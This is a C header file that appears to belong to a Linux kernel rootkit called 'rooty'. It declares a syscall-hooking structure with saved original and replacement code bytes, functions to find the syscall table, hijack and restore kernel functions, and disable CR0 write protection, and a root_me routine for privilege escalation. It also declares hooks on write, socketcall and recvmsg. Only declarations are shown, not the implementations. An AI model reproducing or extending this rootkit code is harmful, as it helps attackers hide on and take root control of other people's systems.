#ifndef ROOTY_SYSCALL_TABLE_H
#define ROOTY_SYSCALL_TABLE_H

#include <linux/list.h>
#include <linux/types.h>

#define HIJACK_SIZE 6

struct sym_hook {
    void *addr;
    unsigned char o_code[HIJACK_SIZE];
    unsigned char n_code[HIJACK_SIZE];
    struct list_head list;
};

struct ksym {
    char *name;
    unsigned long addr;
};

extern unsigned long *syscall_table;
extern struct list_head hooked_syms;

extern asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
extern asmlinkage ssize_t (*o_socketcall)(int call, unsigned long __user *args);
extern asmlinkage ssize_t (*o_sys_recvmsg)(int fd, struct msghdr __user *msg, unsigned flags);

unsigned long *find_sys_call_table(void);
void *memmem(const void *, size_t, const void *, size_t);
void hijack_start(void *target, void *new);
void hijack_pause(void *target);
void hijack_resume(void *target);
void hijack_stop(void *target);
unsigned long disable_wp(void);
void restore_wp(unsigned long cr0);
void root_me(void);

static inline void **get_syscall_table_addr(void)
{
    if (syscall_table == NULL)
        syscall_table = (unsigned long *)find_sys_call_table();
    return (void **)syscall_table;
}

#endif /* ROOTY_SYSCALL_TABLE_H */
